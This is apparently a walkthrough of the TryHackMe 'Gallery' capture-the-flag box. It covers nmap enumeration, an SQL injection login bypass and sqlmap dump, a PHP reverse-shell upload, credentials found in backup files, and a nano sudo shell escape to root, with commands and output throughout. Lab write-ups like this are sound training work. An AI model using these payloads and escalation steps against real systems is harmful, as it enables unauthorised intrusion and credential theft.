---
title: "TryHackMe - Gallery"
date: 2022-02-19
lastmod: 2022-02-19
author: "Kurrupt68"
description: "Try to exploit our image gallery system"
tags: ["tryhackme", "sqli", "rce", "linux"]
categories: ["writeup", "tryhackme"]
---

![Header image](/gallery.png)
Try to exploit our image gallery system

Alright, let's get to it.

## Enumeration

Started with an nmap scan to help identify open ports and services.

```console
⚡ ~/tryhackme/Gallery ❯  nmap -sS -sV -A 10.10.67.206
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-20 16:55 MST
Nmap scan report for 10.10.67.206
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System

Network Distance: 2 hops

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   190.15 ms 10.9.0.1
2   190.12 ms 10.10.67.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.61 seconds
```

hmm,two ports seem to be open and running HTTP services heading over to port 80 shows the Apache2 Ubuntu Default Page, I checked port 8080 that revealed some sort of a Content Management System login page at /gallery/login.php.

## Exploitation

Just one google search and I was able to identify the CMS "Simple Image Gallery System" a little bit more google-fu and I got results that showed the CMS is vulnerable to RCE and  SQL injection in the username field that allows an attacker to bypass the login, possible with this payload.

```sql
admin' or '1'='1'#
```

on the dashboard there are 4 albums and 6 images, clicking on the Album page and then clicking on any album the in link I observed the id URL, at this point I fired up burp to capture the request and then saved it as gallery.req,then I ran sqlmap with the following commands to retrive the admin hash.

```console
⚡  ~/tryhackme > sqlmap -r gallery.req -D gallery_db -T users -C username,password --dump --thread 10
 [18:04:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:04:18] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'gallery_db'
[18:04:18] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'gallery_db'
[18:04:18] [INFO] resumed: 1
[18:04:18] [INFO] retrieving the length of query output
[18:04:18] [INFO] resumed: 32
[18:04:29] [INFO] retrieved: a22_REDACTED_NO_SPOILERS_OFC_XD       
[18:04:29] [INFO] retrieving the length of query output
[18:04:29] [INFO] retrieved: 5
[18:04:34] [INFO] retrieved: admin           
[18:04:34] [INFO] recognized possible password hashes in column 'password'
```

Now to pwn user ; going back to the CMS on port 8080, I could upload images and luckily the CMS is vulnerable to unrestricted file upload. I tried to upload a php-reverse-shell(from pentest monkey). starting my pwncat listner (keep reading you would get to know why I didn't use netcat) on the correct port as specified in my php-reverse-shell-file.

```console
 ⚡ root@kali  ~   pwncat-cs -lp 1232
[18:32:06] Welcome to pwncat 🐈!                                 __main__.py:164
bound to 0.0.0.0:1232 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

To start our reverse shell you can simply click on the php file from the album page and that's it we've got a shell as www-data,looking at the passwd file I noticed that there's a user mike (also from the tryhackme hint).

```console
(remote) www-data@gallery:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
.
.
.
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mike:x:1001:1001:mike:/home/mike:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

Heading over to mike's home folder and listing the files.

```console
(remote) www-data@gallery:/home/mike$ ls -lah 
total 44K
drwxr-xr-x 6 mike mike 4.0K Aug 25 09:15 .
drwxr-xr-x 4 root root 4.0K May 20  2021 ..
-rw------- 1 mike mike  135 May 24  2021 .bash_history
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3.7K May 20  2021 .bashrc
drwx------ 3 mike mike 4.0K May 20  2021 .gnupg
drwxrwxr-x 3 mike mike 4.0K Aug 25 09:15 .local
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
drwx------ 2 mike mike 4.0K May 24  2021 documents
drwx------ 2 mike mike 4.0K May 24  2021 images
-rwx------ 1 mike mike   32 May 14  2021 user.txt
```

Alright **user.txt**, but only mike can read or make changes to this file,next thing I did was to use the find command to locate all files that belonged to mike.

```console
(remote) www-data@gallery:/tmp$ find / 2>/dev/null |grep mike
/home/mike
/home/mike/user.txt
.
.
.
/var/backups/mike_home_backup
.
.
/var/backups/mike_home_backup/documents
/var/backups/mike_home_backup/documents/accounts.txt
/var/backups/mike_home_backup/.profile
```

Alright,there's a back up of mike's home directory and there's a file named accounts.txt that contains credentials to some of mike's accounts

```console
(remote) www-data@gallery:/var/backups/mike_home_backup/documents$ cat accounts.txt 
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```

Sadly these didn't get me into mike's account, so i cheecked the .bashhistory in mike's backup folder,

```console
(remote) www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

and there it's mike's password, i used the su command to get into mike's account, at this point I had access to /home/mike/user.txt, submitted the user flag.

## Becoming root

With the help of linpeas I discoverd mike could run a bash script as root.

```console
mike@gallery:/var/backups/mike_home_backup$ sudo -l 
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

reading the content of the script, mike can carry out a set of operations, the one that stuck out to me was the nano command.

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

heading over to gtfobins , searching for the nano binary we can break out of a restricted environment and spawn a shell right from nano by running this commands in nano here's where using pwncat becomes important, I spent a significant amount of time trying to make this work with a netcat session which didnt work out and i ended up breaking my shell (quite frustrating!).

```bash
^R^X (pressing CTRL+R then CTRL+X_)
reset; sh 1>&0 2>&0 
```

And finally Root!.

```console
root@gallery:/var/backups/mike_home_backup# id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

Gallery is a decent easy box that helps get the basics in, I tried a ton of things trying to solve this box , a RCE script,the numerous sudo exploits.
Note to self: Remember to check for backup files and exploiting capabilities.

![](/sqli-edb.png)
